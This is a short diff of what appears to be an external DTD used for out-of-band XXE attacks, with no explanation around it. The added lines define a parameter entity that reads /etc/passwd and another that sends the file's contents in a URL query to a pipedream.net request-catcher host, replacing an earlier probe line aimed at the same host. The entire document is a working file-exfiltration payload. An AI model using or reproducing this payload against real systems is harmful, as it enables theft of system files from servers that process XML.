@@ -1,1 +1,2 @@
-<!ENTITY % sp SYSTEM "https://enirkytuv22o.x.pipedream.net/testLL">
+<!ENTITY % file SYSTEM "file://etc/passwd">
+<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'https://enirkytuv22o.x.pipedream.net/?%file;'>">
